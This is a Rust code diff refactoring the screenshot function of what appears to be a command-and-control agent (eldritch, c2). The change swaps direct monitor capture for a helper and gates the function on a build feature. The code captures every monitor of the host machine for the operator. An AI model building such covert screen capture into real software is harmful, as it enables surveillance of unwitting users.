@@ -1,7 +1,7 @@
 use alloc::sync::Arc;
 use eldritch_agent::{Agent, Context};
 
-#[cfg(not(target_os = "linux"))]
+#[cfg(feature = "stdlib")]
 use {
     alloc::format,
     alloc::string::{String, ToString},
@@ -11,7 +11,6 @@ use {
     pb::{c2, eldritch},
     std::io::Cursor,
     std::sync::Mutex,
-    xcap::Monitor,
 };
 
 #[cfg(all(unix, feature = "stdlib"))]
@@ -36,27 +35,22 @@ fn get_hostname() -> String {
     "unknown".to_string()
 }
 
-#[cfg(target_os = "linux")]
+#[cfg(not(feature = "stdlib"))]
 pub fn screenshot(agent: Arc<dyn Agent>, context: Context) -> Result<(), String> {
-    return Err(
-        "This OS isn't supported by the screenshot function.\nOnly windows and mac systems are supported".to_string()
-    );
+    Err("Screenshot requires the stdlib feature".into())
 }
 
-#[cfg(not(target_os = "linux"))]
+#[cfg(feature = "stdlib")]
 pub fn screenshot(agent: Arc<dyn Agent>, context: Context) -> Result<(), String> {
-    let monitors = Monitor::all().map_err(|e| e.to_string())?;
+    let images = screenshot::capture_monitors()?;
 
-    if monitors.is_empty() {
+    if images.is_empty() {
         return Ok(());
     }
 
     let hostname = get_hostname();
 
-    for (i, monitor) in monitors.iter().enumerate() {
-        // Capture image
-        let image = monitor.capture_image().map_err(|e| e.to_string())?;
-
+    for (i, image) in images.into_iter().enumerate() {
         // Convert to PNG
         let mut buffer = Cursor::new(Vec::new());
         image
